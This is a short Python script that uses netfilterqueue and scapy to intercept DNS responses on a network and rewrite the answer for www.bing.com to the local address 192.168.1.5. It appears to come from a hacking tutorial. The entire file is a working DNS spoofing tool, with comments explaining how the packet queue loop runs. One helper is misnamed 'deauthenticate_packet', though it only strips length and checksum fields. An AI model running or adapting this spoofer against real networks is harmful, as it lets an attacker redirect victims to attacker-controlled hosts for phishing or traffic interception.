#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def deauthenticate_packet(scapyPacket):
    del scapyPacket[scapy.IP].len
    del scapyPacket[scapy.UDP].len
    del scapyPacket[scapy.IP].chksum
    del scapyPacket[scapy.UDP].chksum

def processPacket(packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.DNSRR): # If it has a response, it must have a question
       question_Name = scapyPacket[scapy.DNSQR].qname
       if "www.bing.com" in question_Name:
           print("Spoofing Bing Website....")
           response_DNS = scapy.DNSRR(rrname=question_Name, rdata="192.168.1.5")
           scapyPacket[scapy.DNS].an = response_DNS
           scapyPacket[scapy.DNS].ancount = 1
           deauthenticate_packet(scapyPacket)
           packet.set_payload(str(scapyPacket))
    packet.accept()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, processPacket) # We bind our linux queue to this queue and set it so that every time a packet is recieved
# in that queue, we will execute the function processPacket, like a loop.
queue.run() # With this command we run the queue so it begins.
